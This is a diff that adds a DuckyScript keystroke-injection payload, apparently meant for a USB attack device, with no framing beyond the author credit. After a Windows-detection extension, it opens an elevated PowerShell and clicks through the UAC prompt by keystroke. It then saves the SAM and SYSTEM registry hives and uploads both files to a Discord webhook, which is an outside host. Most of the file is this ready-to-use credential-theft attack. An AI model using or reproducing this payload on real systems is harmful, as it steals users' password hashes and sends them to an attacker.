@@ -1,0 +1,34 @@
+EXTENSION PASSIVE_WINDOWS_DETECT
+    REM VERSION 1.1
+    REM AUTHOR: Korben
+
+    DEFINE #MAX_WAIT 150
+    DEFINE #CHECK_INTERVAL 20
+    DEFINE #WINDOWS_HOST_REQUEST_COUNT 2
+    DEFINE #NOT_WINDOWS 7
+
+    $_OS = #NOT_WINDOWS
+
+    VAR $MAX_TRIES = #MAX_WAIT
+    WHILE(($_RECEIVED_HOST_LOCK_LED_REPLY == FALSE) && ($MAX_TRIES > 0))
+        DELAY #CHECK_INTERVAL
+        $MAX_TRIES = ($MAX_TRIES - 1)
+    END_WHILE
+    IF ($_HOST_CONFIGURATION_REQUEST_COUNT > #WINDOWS_HOST_REQUEST_COUNT) THEN
+        $_OS = WINDOWS
+    END_IF
+END_EXTENSION
+
+DEFINE #DISCORD_WEBHOOK_URL DISCORD_WEBHOOK_URL_HERE
+GUI d
+DELAY 1000
+GUI r
+DELAY 1000
+STRINGLN powershell Start-Process powershell -Verb runAs
+DELAY 3000
+LEFTARROW
+ENTER
+DELAY 3000
+STRINGLN C:\Windows\System32\reg save HKLM\SAM sam /y; C:\Windows\System32\reg save HKLM\SYSTEM system /y; Add-Type -AssemblyName "System.Net.Http"; $webhookUrl = "#DISCORD_WEBHOOK_URL"; $client = New-Object System.Net.Http.HttpClient; $fileStream1 = [System.IO.File]::OpenRead("sam"); $fileContent1 = New-Object System.Net.Http.StreamContent($fileStream1); $content1 = New-Object System.Net.Http.MultipartFormDataContent; $content1.Add($fileContent1, "file", "sam"); $client.PostAsync($webhookUrl, $content1).Result; $fileStream1.Close(); $fileStream2 = [System.IO.File]::OpenRead("system"); $fileContent2 = New-Object System.Net.Http.StreamContent($fileStream2); $content2 = New-Object System.Net.Http.MultipartFormDataContent; $content2.Add($fileContent2, "file", "system"); $client.PostAsync($webhookUrl, $content2).Result; $fileStream2.Close()
+DELAY 500
+GUI d
